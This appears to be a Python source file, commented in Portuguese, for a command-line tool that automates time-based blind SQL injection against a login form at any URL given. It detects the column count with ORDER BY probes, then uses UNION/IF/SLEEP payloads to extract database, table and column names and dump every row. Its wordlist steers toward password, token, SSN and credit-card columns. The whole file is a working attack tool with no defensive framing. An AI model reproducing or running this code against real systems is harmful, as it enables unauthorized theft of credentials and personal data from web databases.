import bisect
import json
from pathlib import Path
import argparse
import requests
import string
import time

SLEEP_SECONDS = 3
PRINTABLE_CHARS = string.printable

# Estado global da sessão
_config = {
    "url": None,
    "method": "POST",
    "timeout": 10,
}


VALID_CHARS_DATA = (          # para valores (senhas, dados reais)
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "_-@.#$!%&*()+=[]{}|;:,.<>?~^"
)

VALID_CHARS_META = (          # para nomes de DB/tabela/coluna
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "_"
)

# ── Modelo de frequência (bigrama/n-gram simples) ────────────────────────────

class CharFrequencyModel:
    """
    Modelo probabilístico baseado em frequência de bigramas.
    Ordena o charset pelo caractere mais provável dado o prefixo atual.

    Equivalente a um Markov de ordem 1:
        P(char | prefixo[-1]) ∝ contagem de ocorrências no corpus
    """

    # Corpus de nomes reais de DBs, tabelas e colunas SQL
    # (pode ser ampliado com wordlists reais)
    DEFAULT_CORPUS = [
        # ── Bancos de dados comuns ─────────────────────────────────────────────
        "mysql", "sys", "information_schema", "performance_schema",
        "wordpress", "joomla", "drupal", "magento", "prestashop",
        "phpbb", "mybb", "vbulletin", "opencart", "oscommerce",
        "app", "db", "database", "prod", "production", "dev", "development",
        "staging", "test", "backup", "main", "core", "portal", "api",

        # ── Tabelas — autenticação e usuários ──────────────────────────────────
        "users", "user", "members", "member", "accounts", "account",
        "admins", "admin", "administrators", "superusers",
        "auth", "authentication", "credentials", "logins",
        "staff", "employees", "employee", "operators",
        "customers", "customer", "clients", "client",
        "subscribers", "subscriber", "contacts", "contact",
        "profiles", "profile",

        # ── Tabelas — conteúdo e negócio ───────────────────────────────────────
        "posts", "post", "articles", "article", "pages", "page",
        "comments", "comment", "messages", "message",
        "orders", "order", "order_items", "order_item",
        "products", "product", "items", "item", "inventory",
        "categories", "category", "tags", "tag",
        "payments", "payment", "transactions", "transaction",
        "invoices", "invoice", "billing",
        "cart", "carts", "wishlist",
        "reviews", "review", "ratings", "rating",
        "news", "blog", "feeds", "feed",

        # ── Tabelas — sistema e infra ──────────────────────────────────────────
        "sessions", "session", "tokens", "token",
        "logs", "log", "audit_log", "audit_logs", "access_log",
        "events", "event", "notifications", "notification",
        "settings", "setting", "config", "configs", "configuration",
        "options", "option", "preferences", "preference",
        "roles", "role", "permissions", "permission",
        "groups", "group", "group_members",
        "files", "file", "uploads", "upload", "attachments", "attachment",
        "emails", "email", "email_queue", "mail_queue",
        "jobs", "job", "queue", "queues", "tasks", "task",
        "migrations", "migration", "schema_migrations",
        "cache", "caches",

        # ── WordPress ─────────────────────────────────────────────────────────
        "wp_users", "wp_posts", "wp_options", "wp_comments",
        "wp_terms", "wp_term_taxonomy", "wp_term_relationships",
        "wp_postmeta", "wp_usermeta", "wp_commentmeta",
        "wp_links", "wp_user_roles",

        # ── Colunas — identidade ───────────────────────────────────────────────
        "id", "uid", "uuid", "user_id", "account_id", "member_id",
        "customer_id", "admin_id", "profile_id",

        # ── Colunas — autenticação ─────────────────────────────────────────────
        "username", "user_name", "login", "handle", "nickname", "nick",
        "password", "passwd", "pass", "pwd", "password_hash",
        "password_digest", "encrypted_password", "hashed_password",
        "salt", "hash", "secret", "api_key", "api_secret",
        "token", "access_token", "refresh_token", "auth_token",
        "remember_token", "reset_token", "activation_token",
        "two_factor_secret", "otp_secret",

        # ── Colunas — contato ──────────────────────────────────────────────────
        "email", "email_address", "mail",
        "phone", "phone_number", "mobile", "telephone", "fax",
        "address", "street", "street_address",
        "city", "state", "country", "zip", "postal_code", "region",

        # ── Colunas — nome ─────────────────────────────────────────────────────
        "name", "full_name", "display_name",
        "first_name", "last_name", "middle_name",
        "firstname", "lastname",

        # ── Colunas — status e controle ────────────────────────────────────────
        "status", "active", "is_active", "enabled", "is_enabled",
        "verified", "is_verified", "email_verified",
        "banned", "is_banned", "blocked", "is_blocked",
        "role", "roles", "permission", "permissions", "level", "rank",
        "type", "user_type", "account_type",

        # ── Colunas — datas ────────────────────────────────────────────────────
        "created_at", "updated_at", "deleted_at",
        "created", "modified", "last_modified",
        "last_login", "last_seen", "last_active",
        "registered_at", "joined_at", "verified_at",
        "expires_at", "expired_at",
        "birth_date", "birthdate", "dob", "date_of_birth",

        # ── Colunas — dados sensíveis ──────────────────────────────────────────
        "ssn", "social_security", "national_id", "passport",
        "credit_card", "card_number", "cvv", "expiry",
        "balance", "credit", "points", "score",
        "salary", "income", "tax_id",
        "ip_address", "ip", "last_ip", "login_ip",
        "user_agent", "browser",

        # ── Colunas — conteúdo ────────────────────────────────────────────────
        "title", "slug", "content", "body", "description",
        "summary", "excerpt", "text", "note", "notes", "comment",
        "url", "link", "image", "avatar", "photo", "thumbnail",
        "filename", "file_path", "mime_type", "size",

        # ── Colunas — relacionamentos ──────────────────────────────────────────
        "parent_id", "category_id", "post_id", "order_id",
        "product_id", "session_id", "token_id", "role_id",
        "group_id", "org_id", "company_id", "department_id",

        # ── Valores comuns (para dump de dados) ───────────────────────────────
        "admin", "administrator", "root", "superuser", "sysadmin",
        "test", "guest", "demo", "user", "default",
        "true", "false", "null", "none",
        "active", "inactive", "pending", "approved", "rejected",
        "enabled", "disabled", "banned", "verified",
    ]

    def __init__(self, corpus: list[str] | None = None):
        self.bigrams: dict[str, dict[str, int]] = {}
        self.unigrams: dict[str, int] = {}
        self._build(corpus or self.DEFAULT_CORPUS)

    def _build(self, corpus: list[str]):
        for word in corpus:
            word = word.lower()
            for i, ch in enumerate(word):
                self.unigrams[ch] = self.unigrams.get(ch, 0) + 1
                if i > 0:
                    prev = word[i - 1]
                    self.bigrams.setdefault(prev, {})
                    self.bigrams[prev][ch] = self.bigrams[prev].get(ch, 0) + 1

    def rank_chars(self, prefix: str, charset: str) -> list[str]:
        """
        Retorna charset ordenado do mais ao menos provável
        dado o último caractere do prefixo (bigrama).
        """
        last = prefix[-1].lower() if prefix else ""
        context = self.bigrams.get(last, {})

        def score(ch: str) -> int:
            return context.get(ch, 0) * 10 + self.unigrams.get(ch, 0)

        return sorted(charset, key=score, reverse=True)


# ── Busca binária sobre charset ordenado por frequência ──────────────────────

def binary_search_char(
    prefix: str,
    model: CharFrequencyModel,
    charset: str,
    query_fn,
    query_template: str,  # ← necessário para query de comparação
) -> str | None:
    ranked = model.rank_chars(prefix, charset)

    # Fase 1: top-10 mais prováveis pelo modelo
    for ch in ranked[:10]:
        if query_fn(prefix + ch):
            return ch

    # Fase 2: busca binária real por ASCII sobre os restantes
    remaining = sorted(ranked[10:], key=lambda c: ord(c))
    position = len(prefix) + 1  # posição SQL (1-indexed)

    lo, hi = 0, len(remaining) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        pivot_char = remaining[mid]
        pivot_ascii = ord(pivot_char)

        # Query que dorme se ASCII do char real > ASCII do pivot
        gt_query = query_template.format(
            guess=f"X) and ascii(substring(({_extract_subquery(query_template)}),{position},1))>{pivot_ascii} -- -",
            length=1
        )

        start = time.time()
        make_request(gt_query)
        elapsed = time.time() - start
        is_greater = elapsed >= SLEEP_SECONDS

        if is_greater:
            lo = mid + 1
        else:
            hi = mid - 1

    # lo aponta para o candidato mais provável — testa diretamente
    if 0 <= lo < len(remaining):
        if query_fn(prefix + remaining[lo]):
            return remaining[lo]

    return None


def _extract_subquery(template: str) -> str:
    """Extrai a subquery SQL do template para uso na comparação ASCII."""
    # Template tem formato: "...if(substring((SUBQUERY),1,{length})='{guess}'..."
    try:
        start = template.index("substring((") + len("substring((")
        end = template.index("),1,{length})")
        return template[start:end]
    except ValueError:
        return "select database()"

def _char_is_greater(prefix: str, pivot: str, query_fn, charset: str) -> bool:
    charset_sorted = sorted(charset)  # ← usa o charset passado, não VALID_CHARS global
    pivot_idx = charset_sorted.index(pivot) if pivot in charset_sorted else -1

    if pivot_idx < 0 or pivot_idx >= len(charset_sorted) - 1:
        return False

    next_ch = charset_sorted[pivot_idx + 1]
    return query_fn(prefix + next_ch)

# ── Wordlist: tenta nomes completos antes de extrair char a char ─────────────

class WordlistMatcher:
    """
    Tenta adivinhar o valor completo por uma wordlist antes de
    recorrer à extração caractere a caractere.

    Estratégia:
        1. Filtra wordlist pelo prefixo já extraído
        2. Ordena por frequência no corpus
        3. Testa os N candidatos mais prováveis
    """

    def __init__(self, words: list[str] | None = None):
        self.words = [w.lower() for w in (words or CharFrequencyModel.DEFAULT_CORPUS)]

    def candidates(self, prefix: str, top_n: int = 15) -> list[str]:
        prefix = prefix.lower()
        matches = [w for w in self.words if w.startswith(prefix) and w != prefix]
        # Ordena pelos mais curtos (nomes simples aparecem mais)
        return sorted(matches, key=len)[:top_n]

    def load_file(self, path: str):
        """Carrega wordlist de arquivo (um nome por linha)."""
        p = Path(path)
        if p.exists():
            self.words = [
                line.strip().lower()
                for line in p.read_text().splitlines()
                if line.strip()
            ]
            print(f"[*] Wordlist carregada: {len(self.words)} entradas de {path}")


# ── Motor de extração unificado ──────────────────────────────────────────────

VALID_CHARS = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "_-@.#$!%&*()+=[]{}|;:,.<>?~^"
)

def _confirm_exact(value: str, query_template: str, charset: str = VALID_CHARS_META) -> bool:
    """
    Confirma que o valor extraído é exato testando se existe próximo char.
    Usa o charset correto para o contexto (meta vs dados).
    """
    for ch in charset:
        probe = value + ch
        query = query_template.format(guess=probe, length=len(probe))
        start = time.time()
        make_request(query)
        elapsed = time.time() - start
        print(f"  [?] Confirmando fim: {repr(probe)} ({elapsed:.2f}s)", end="\r")
        if elapsed >= SLEEP_SECONDS:
            print(f"\n  [~] Valor continua após '{value}', próximo char: '{ch}'")
            return False
    return True

def linear_search_char(
    prefix: str,
    model: CharFrequencyModel,
    charset: str,
    query_fn,
) -> str | None:
    """
    Varredura linear ordenada por frequência (modelo de Markov).
    Simples, confiável, sem risco de SQL malformado.
    O ganho vem da ordem — chars mais prováveis são testados primeiro.
    """
    ranked = model.rank_chars(prefix, charset)

    for ch in ranked:
        if query_fn(prefix + ch):
            return ch

    return None


def smart_inject(
    query_template: str,
    model: CharFrequencyModel,
    wordlist: WordlistMatcher,
    max_length: int = 50,
    wordlist_top_n: int = 15,
    exclude: set[str] = set(),
    charset: str = VALID_CHARS_META,
) -> str:
    extracted = ""

    def query_fn(guess: str) -> bool:
        query = query_template.format(guess=guess, length=len(guess))
        start = time.time()
        make_request(query)
        elapsed = time.time() - start
        print(f"  [{'+' if elapsed >= SLEEP_SECONDS else ' '}] {repr(guess)} ({elapsed:.2f}s)", end="\r")
        return elapsed >= SLEEP_SECONDS

    while len(extracted) < max_length:
        # Etapa 1: wordlist
        candidates = [
            c for c in wordlist.candidates(extracted, top_n=wordlist_top_n)
            if c not in exclude
        ]
        wordlist_hit = None
        for candidate in candidates:
            if query_fn(candidate):
                wordlist_hit = candidate
                break

        if wordlist_hit:
            print(f"\n  [W] Wordlist candidata: '{wordlist_hit}' — confirmando...")
            if _confirm_exact(wordlist_hit, query_template, charset):
                print(f"\n  [W] Confirmado: '{wordlist_hit}'")
                return wordlist_hit
            else:
                print(f"\n  [~] Usando '{wordlist_hit}' como prefixo...")
                extracted = wordlist_hit
                continue

        # Etapa 2: linear ordenada por frequência (sem bisect)
        found = linear_search_char(extracted, model, charset, query_fn)

        if found:
            extracted += found
            print(f"\n  [B] Char '{found}' → '{extracted}'")
        else:
            if extracted:
                print(f"\n[+] Extração concluída: '{extracted}'")
            break

    return extracted

def _has_next_char(current: str, template: str) -> bool:
    """Verifica se existe um próximo caractere (valor maior que o atual)."""
    # Testa se substring de tamanho len+1 existe
    probe = current + "a"  # qualquer char — só checa o comprimento
    query = template.format(
        guess=f"' or length(({template.split('(')[1].split(')')[0]}))>{len(current)} -- -",
        length=len(probe)
    )
    # Simplificado: assume que a wordlist acertou o valor completo
    return False


# ── Funções públicas atualizadas ─────────────────────────────────────────────

def make_extractor(wordlist_path: str | None = None):
    """Cria modelo e wordlist compartilhados entre todas as extrações."""
    model = CharFrequencyModel()
    wl = WordlistMatcher()
    if wordlist_path:
        wl.load_file(wordlist_path)
    return model, wl


def fuzz_db(model: CharFrequencyModel, wordlist: WordlistMatcher) -> str:
    print("[*] Extraindo banco de dados...")
    template = (
        "' union select 1,2,"
        "if(substring((select database()),1,{length})='{guess}',sleep(3),NULL) -- -"
    )
    result = smart_inject(template, model, wordlist, charset=VALID_CHARS_META)
    print(f"[+] Database: '{result}'")
    return result

def fuzz_table(
    db: str, offset: int,
    model: CharFrequencyModel, wordlist: WordlistMatcher,
    exclude: set[str] = set()
) -> str:
    template = (
        f"' union select 1,2,if(substring("
        f"(select table_name from information_schema.tables "
        f"where table_schema='{db}' limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    return smart_inject(template, model, wordlist, charset=VALID_CHARS_META, exclude=exclude)


def fuzz_column(
    db: str, table: str, offset: int,
    model: CharFrequencyModel, wordlist: WordlistMatcher,
    exclude: set[str] = set()
) -> str:
    template = (
        f"' union select 1,2,if(substring("
        f"(select column_name from information_schema.columns "
        f"where table_schema='{db}' and table_name='{table}' limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    return smart_inject(template, model, wordlist, charset=VALID_CHARS_META, exclude=exclude)


def fuzz_all_tables(db: str, model, wordlist, max_tables=20) -> list[str]:
    print(f"\n[*] Mapeando tabelas de '{db}'...")
    tables = []
    for i in range(max_tables):
        name = fuzz_table(db, i, model, wordlist)
        if not name:
            break
        tables.append(name)
        print(f"  [+] Tabela [{i}]: '{name}'")
    return tables


def fuzz_all_columns(db: str, table: str, model, wordlist, max_cols=20) -> list[str]:
    print(f"\n[*] Mapeando colunas de '{db}.{table}'...")
    cols = []
    for i in range(max_cols):
        name = fuzz_column(db, table, i, model, wordlist)
        if not name:
            break
        cols.append(name)
        print(f"  [+] Coluna [{i}]: '{name}'")
    return cols

def fuzz_data(
    db: str, table: str, column: str, offset: int,
    model: CharFrequencyModel, wordlist: WordlistMatcher,
) -> str:
    template = (
        f"' union select 1,2,if(substring("
        f"(select {column} from {db}.{table} limit {offset},1)"
        f",1,{{length}})='{{guess}}',sleep(3),NULL) -- -"
    )
    return smart_inject(template, model, wordlist, charset=VALID_CHARS_DATA)


def fuzz_all_data(
    db: str, table: str, columns: list[str],
    model: CharFrequencyModel, wordlist: WordlistMatcher,
    max_rows: int = 50,
) -> list[dict]:
    """Extrai todas as linhas de uma tabela para as colunas fornecidas."""
    print(f"\n[*] Extraindo dados de '{db}.{table}'...")
    rows = []

    for row_i in range(max_rows):
        print(f"\n  [*] Linha {row_i}...")
        row = {}

        for col in columns:
            print(f"    [*] Coluna '{col}'...")
            value = fuzz_data(db, table, col, row_i, model, wordlist)
            row[col] = value
            print(f"    [+] {col} = '{value}'")

        # Linha vazia = não há mais registros
        if not any(row.values()):
            print(f"  [*] Sem mais linhas após {row_i}.")
            break

        rows.append(row)
        print(f"  [+] Linha {row_i}: {row}")

    return rows


def print_table(table_name: str, rows: list[dict]):
    """Exibe os dados extraídos em formato de tabela."""
    if not rows:
        print("  (sem dados)")
        return

    cols = list(rows[0].keys())
    widths = {c: max(len(c), max(len(r.get(c, "")) for r in rows)) for c in cols}

    sep = "+-" + "-+-".join("-" * widths[c] for c in cols) + "-+"
    header = "| " + " | ".join(c.ljust(widths[c]) for c in cols) + " |"

    print(f"\n  {table_name}")
    print(f"  {sep}")
    print(f"  {header}")
    print(f"  {sep}")
    for row in rows:
        line = "| " + " | ".join(row.get(c, "").ljust(widths[c]) for c in cols) + " |"
        print(f"  {line}")
    print(f"  {sep}")

def get_ordenation_query(index: int) -> str:
    return f"' or 1=1 order by {index} -- -"


def get_ordenation() -> int:
    """
    Determina o número de colunas via ORDER BY injection.
    Retorna o número de colunas como int, ou -1 se não detectado.
    """
    MAX_COLUMNS = 20
    BASELINE_REQUESTS = 2
    CHANGE_THRESHOLD = 0.10

    all_results: list[dict] = []

    for i in range(1, MAX_COLUMNS + 1):
        res = make_request(get_ordenation_query(i))
        content_length = res["content_length"]
        all_results.append({"index": i, "length": content_length})

        print(f"  ORDER BY {i}: {content_length} bytes (status {res['status_code']})")

        if i <= BASELINE_REQUESTS:
            continue

        baseline = sum(r["length"] for r in all_results[:BASELINE_REQUESTS]) / BASELINE_REQUESTS
        deviation = abs(content_length - baseline) / baseline

        if deviation > CHANGE_THRESHOLD:
            total_columns = i - 1
            print(
                f"\n[!] Mudança detectada no ORDER BY {i} "
                f"({content_length} bytes vs baseline {baseline:.0f} bytes)\n"
                f"[+] Total de colunas: {total_columns}"
            )
            return total_columns

    print(f"[!] Não foi possível detectar o número de colunas em {MAX_COLUMNS} tentativas.")
    return -1


def make_request(query: str) -> dict:
    """
    Realiza requisição usando as configurações globais (_config).
    Suporta GET e POST. Não lança exceção em erros HTTP (4xx/5xx).
    """
    url = _config["url"]
    method = _config["method"]
    timeout = _config["timeout"]

    try:
        if method == "POST":
            data = {"username": query, "password": "aaas"}
            response = requests.post(url, data=data, timeout=timeout)
        elif method == "GET":
            response = requests.get(url, params={"username": query}, timeout=timeout)
        else:
            raise ValueError(f"Método HTTP não suportado: {method}")

        # Não lança exceção — o status é apenas registrado, erros 4xx/5xx podem ser
        # respostas válidas para fins de detecção de injeção
        return {
            "url": response.url,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "response_time_seconds": response.elapsed.total_seconds(),
            "content_length": len(response.text),
            "content_type": response.headers.get("Content-Type"),
            "body": response.text,
        }

    except requests.exceptions.ConnectionError:
        print(f"[!] Erro de conexão com {url}")
        raise
    except requests.exceptions.Timeout:
        print(f"[!] Timeout após {timeout}s")
        raise



def execute(wordlist_path: str | None = None):
    print(f"[*] Alvo: {_config['url']} [{_config['method']}]\n")

    model, wordlist = make_extractor(wordlist_path)

    print("[*] Etapa 1: Detectando colunas...")
    qty = get_ordenation()
    if qty == -1:
        print("[!] Abortando.")
        return

    print(f"\n[*] Etapa 2: Identificando banco...")
    db = fuzz_db(model, wordlist)
    if not db:
        return

    print(f"\n[*] Etapa 3: Mapeando tabelas...")
    tables = fuzz_all_tables(db, model, wordlist)

    print(f"\n[*] Etapa 4: Mapeando colunas...")
    schema = {t: fuzz_all_columns(db, t, model, wordlist) for t in tables}

    print("\n[+] Schema completo:")
    for table, cols in schema.items():
        print(f"  {db}.{table}: {cols}")

    print(f"\n[*] Etapa 5: Extraindo dados...")
    dump: dict[str, list[dict]] = {}

    for table, cols in schema.items():
        if not cols:
            continue
        rows = fuzz_all_data(db, table, cols, model, wordlist)
        dump[table] = rows
        print_table(f"{db}.{table}", rows)

    print("\n[+] Dump completo:")
    for table, rows in dump.items():
        print(f"  {table}: {len(rows)} linha(s)")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Automation Tool")

    parser.add_argument("--url", required=True, help="URL do alvo")
    parser.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="POST",
        help="Método HTTP (padrão: POST)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout das requisições em segundos (padrão: 10)",
    )
    parser.add_argument(
        "--wordlist",
        required=False,
        default=None,
        help="Caminho para wordlist (um nome por linha)",
    )

    args = parser.parse_args()

    _config["url"] = args.url
    _config["method"] = args.method
    _config["timeout"] = args.timeout

    execute(wordlist_path=args.wordlist)


if __name__ == "__main__":
    main()